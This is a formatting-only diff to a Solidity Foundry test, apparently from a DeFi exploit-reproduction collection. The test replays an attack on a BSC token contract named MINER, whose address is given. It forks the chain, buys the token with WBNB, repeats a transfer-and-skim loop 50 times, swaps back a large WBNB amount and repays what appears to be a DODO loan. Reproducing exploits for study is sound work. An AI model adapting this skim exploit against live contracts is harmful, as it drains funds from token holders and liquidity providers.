@@ -15,9 +15,9 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://bscscan.com/address/0x2ba9d4a8c41c60b71ff7df2c3f54b008644b954e#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 contract MINER is BaseTestWithBalanceLog {
@@ -31,7 +31,7 @@ contract MINER is BaseTestWithBalanceLog {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 36_111_183-1);
+        cheats.createSelectFork("bsc", 36_111_183 - 1);
     }
 
     function testExploit() public {
@@ -46,9 +46,10 @@ contract MINER is BaseTestWithBalanceLog {
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(Miner);
-        uint256[] memory amounts = Router.swapTokensForExactTokens(10*1e12, baseAmount, path, address(this), block.timestamp);
-        
-        uint index = 1;
+        uint256[] memory amounts =
+            Router.swapTokensForExactTokens(10 * 1e12, baseAmount, path, address(this), block.timestamp);
+
+        uint256 index = 1;
         // transfer to pair and skim
         while (index <= 50) {
             uint256 balance = Miner.balanceOf(address(this));
@@ -58,7 +59,7 @@ contract MINER is BaseTestWithBalanceLog {
         }
 
         // end while loop, swap back
-        Pair.swap(0, 3500751853374879579, address(this), "");
+        Pair.swap(0, 3_500_751_853_374_879_579, address(this), "");
         WBNB.transfer(dodo, 10 * 1e18);
     }
 }
